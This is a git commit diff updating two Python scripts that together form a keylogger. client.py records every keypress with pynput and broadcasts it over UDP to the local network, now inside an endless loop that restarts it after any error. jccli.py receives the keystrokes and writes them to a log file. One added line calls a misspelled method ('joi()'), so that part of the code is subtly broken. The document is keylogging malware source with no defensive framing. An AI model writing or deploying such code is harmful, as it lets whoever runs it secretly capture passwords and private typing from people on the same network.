75efce45af1b908df7d4e7a1cd428afa02bb889e
gitpetyr <petyrma@icloud.com>
2025-01-19 09:27:18 +0800

    Upd202501190927

--- client.py
+++ client.py
@@ -1,18 +1,28 @@
 import pynput,socket,secrets
 
-clientid=secrets.token_hex(6)
-sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+def main():
+    clientid=secrets.token_hex(6)
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
-sock.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
+    sock.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
 
-print("run")
+    print("run")
 
-broadcast_ip="255.255.255.255"
-broadcast_port=5060
+    broadcast_ip="255.255.255.255"
+    broadcast_port=50601
 
-def client(event):
-    sock.sendto(f"{clientid} => [{str(event)}]".encode("utf-8"),(broadcast_ip,broadcast_port))
-    print(f"{clientid} => [{str(event)}]")
+    def client(event):
+        sock.sendto(f"{clientid} => [{str(event)}]".encode("utf-8"),(broadcast_ip,broadcast_port))
+        print(f"{clientid} => [{str(event)}]")
 
-with pynput.keyboard.Listener(on_press=client) as keyboardlogger:
-    keyboardlogger.join()
+    with pynput.keyboard.Listener(on_press=client) as keyboardlogger:
+        keyboardlogger.joi()
+        while True:pass
+    while True:pass
+
+if __name__=="__main__":
+    while True:
+        try:
+            main()
+        finally:
+            continue
--- jccli.py
+++ jccli.py
@@ -10,13 +10,19 @@ sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 sock.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
 
 ip=socket.gethostbyname(socket.gethostname())
-port=5060
+port=50601
 
 sock.bind(("",port))
 
 while True:
-    data,addr=sock.recvfrom(1048576)
-    nowtime=datetime.datetime.now().strftime("%Y/%m/%d-%H:%M:%S:%f")
-    msg=f"[{nowtime}:FROM{str(addr)} ] == {data.decode("utf-8")}"
-    open(LogFile,'a').write(msg+"\n")
-    print(msg)
+    try:
+        data,addr=sock.recvfrom(1048576)
+        nowtime=datetime.datetime.now().strftime("%Y/%m/%d-%H:%M:%S:%f")
+        msg=f"[{nowtime}:FROM{str(addr)} ] == {data.decode("utf-8")}"
+        print(msg)
+        open(LogFile,'a').write(msg+"\n")
+    except Exception as e:
+        msg=str(e)
+        print(e)
+    finally:
+        continue
